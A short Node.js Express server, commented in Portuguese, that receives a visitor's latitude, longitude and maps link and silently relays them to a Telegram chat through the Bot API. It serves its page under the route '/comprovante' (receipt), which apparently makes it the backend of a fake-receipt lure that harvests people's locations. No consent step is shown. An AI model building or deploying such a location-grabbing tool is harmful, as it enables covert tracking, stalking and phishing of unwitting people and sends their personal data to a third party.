// server.js
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const app = express();
app.use(cors());
app.use(bodyParser.json());

// Servir arquivos estáticos (caso tenha CSS, JS, etc.)
const path = require("path");
app.use(express.static(__dirname));
require('dotenv').config();


const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

app.post("/send-location", async (req, res) => {
  const { latitude, longitude, maps } = req.body;

  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}\nMaps: ${maps}`;

  try {
    // Envia a localização para o Telegram
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    res.status(200).json({ success: true });
  } catch (error) {
    console.log(error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});



// Rota para servir o index.html diretamente
app.get("/comprovante", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});


app.listen(8088, () => {
  console.log("Servidor rodando na porta 8088");
});